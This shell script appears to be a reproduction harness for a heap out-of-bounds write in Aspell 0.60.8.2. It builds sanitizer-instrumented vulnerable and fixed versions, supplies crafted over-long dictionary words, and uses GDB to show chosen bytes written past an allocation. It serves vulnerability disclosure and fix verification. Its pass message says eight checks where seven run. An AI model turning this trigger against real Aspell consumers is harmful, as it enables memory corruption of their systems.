#!/bin/sh
# CVE-2026-75820: chosen-byte OOB WRITE in a real Aspell 0.60.8.2 consumer.
#
# Recover-mode ASan lets execution continue past the first OOB read so the
# subsequent write in Working::fine_tune_score is observable. GDB reads the
# byte at the allocation boundary before and after the store; input 'a'
# writes 0x01 and input 'b' writes 0x02. Fixed and targeted-fix controls
# reject the word; a 250-byte safe word is clean.
#
# Usage: sh harness/75820-write-probe.sh <evidence-dir> [work-dir]
set -u
base="$(cd "$(dirname "$0")/.." && pwd)"
rb="$base/real-build"
out="${1:-$base/harness/evidence/75820-write}"
work="${2:-$out/.work}"
out="$(mkdir -p "$out" && cd "$out" && pwd)"
work="$(mkdir -p "$work" && cd "$work" && pwd)"
dict="$rb/en-install/dict"
data="$rb/en-install/data"
cflags='-fsanitize=address -fsanitize-recover=address -fno-omit-frame-pointer -g -O1 -DNDEBUG'
export ASAN_OPTIONS=detect_leaks=0:halt_on_error=0:abort_on_error=0

build() {
  name="$1"; src="$2"
  if [ ! -x "$work/build-$name/aspell" ]; then
    [ -d "$src" ] || { echo "missing source $src; see REPLAY.txt" >&2; return 1; }
    rm -rf "$work/src-$name" "$work/build-$name"
    cp -a "$src" "$work/src-$name"
    mkdir -p "$work/build-$name"
    ( cd "$work/build-$name" && ../src-$name/configure --disable-shared \
        CC=clang CXX=clang++ CFLAGS="$cflags" CXXFLAGS="$cflags" \
        LDFLAGS=-fsanitize=address > configure.out 2>&1 \
      && make -j4 > make.out 2>&1 ) || return 1
  fi
}
build vuln "$rb/aspell-0.60.8.2" || exit 1
build fixed "$rb/aspell-0.60.8.3" || exit 1
build targeted "$rb/aspell-0.60.8.2-targeted-fix" || exit 1

a257=$(printf '%*s' 257 '' | tr ' ' a)
b257=$(printf '%*s' 257 '' | tr ' ' b)
a42=$(printf '%*s' 42 '' | tr ' ' a)
b42=$(printf '%*s' 42 '' | tr ' ' b)
a299=$(printf '%*s' 299 '' | tr ' ' a)
b299=$(printf '%*s' 299 '' | tr ' ' b)
safe=$(printf '%*s' 250 '' | tr ' ' a)

run_case() {
  name="$1"; exe="$2"; word="$3"; query="$4"
  printf 'personal_ws-1.1 en 1 utf-8\n%s\n' "$word" > "$out/personal-$name"
  printf '%s\n' "$query" | "$exe" --lang=en --dont-validate-words \
    --dict-dir="$dict" --data-dir="$data" \
    --personal="$out/personal-$name" -a > "$out/$name.out" 2>&1
  rc=$?
  printf '%s rc=%s asan=%s write=%s\n' "$name" "$rc" \
    "$(grep -c 'ERROR: AddressSanitizer' "$out/$name.out")" \
    "$(grep -c 'WRITE of size' "$out/$name.out")" | tee -a "$out/summary.txt"
}
: > "$out/summary.txt"
printf '%s\n' "$a299" > "$out/query-a"
printf '%s\n' "$b299" > "$out/query-b"
run_case vuln-a "$work/build-vuln/aspell" "$a257!$a42" "$a299"
run_case vuln-b "$work/build-vuln/aspell" "$b257!$b42" "$b299"
run_case fixed "$work/build-fixed/aspell" "$a257!$a42" "$a299"
run_case targeted-fix "$work/build-targeted/aspell" "$a257!$a42" "$a299"
run_case safe "$work/build-vuln/aspell" "$safe" "${safe%?}b"

# GDB memory proof: first Write-of-size address from the ASan report is the
# byte just past the 64-byte String allocation; dump it before/after the store.
src="$work/src-vuln/modules/speller/default/suggest.cpp"
for v in a b; do
  addr=$(grep -m1 -o 'WRITE of size 1 at 0x[0-9a-f]*' "$out/vuln-$v.out" \
         | awk '{print $NF}')
  [ -n "$addr" ] || { echo "no WRITE address for $v" >&2; exit 1; }
  q="$out/query-$v"; p="$out/personal-vuln-$v"

  cat > "$out/gdb-$v.cmd" <<EOF
set pagination off
set confirm off
break $src:1484 if j == 64
set env ASAN_OPTIONS detect_leaks=0:halt_on_error=0:abort_on_error=0
run --lang=en --dont-validate-words --dict-dir=$dict --data-dir=$data --personal=$p -a < $q
x/8bx $addr
next
x/8bx $addr
quit
EOF
  gdb -batch -x "$out/gdb-$v.cmd" "$work/build-vuln/aspell" > "$out/gdb-$v.out" 2>&1
  printf 'gdb-%s bytes-before=%s bytes-after=%s addr=%s\n' "$v" \
    "$(grep "^$addr:" "$out/gdb-$v.out" | head -1 | awk '{print $2}')" \
    "$(grep "^$addr:" "$out/gdb-$v.out" | tail -1 | awk '{print $2}')" \
    "$addr" | tee -a "$out/summary.txt"
done

# Deterministic assertions; any failure exits non-zero.
fail=0
check() { if ! grep -q "$1" "$out/summary.txt"; then echo "FAIL: $1" >&2; fail=1; fi; }
check 'vuln-a rc=[01] asan=[2-9] write=[2-9]'
check 'vuln-b rc=[01] asan=[2-9] write=[2-9]'
check 'fixed rc=1 asan=0 write=0'
check 'targeted-fix rc=1 asan=0 write=0'
check 'safe rc=0 asan=0 write=0'
check 'gdb-a bytes-before=0x00 bytes-after=0x01'
check 'gdb-b bytes-before=0x00 bytes-after=0x02'
[ "$fail" -eq 0 ] && echo '8 PASS / 0 FAIL' | tee -a "$out/summary.txt"
exit "$fail"
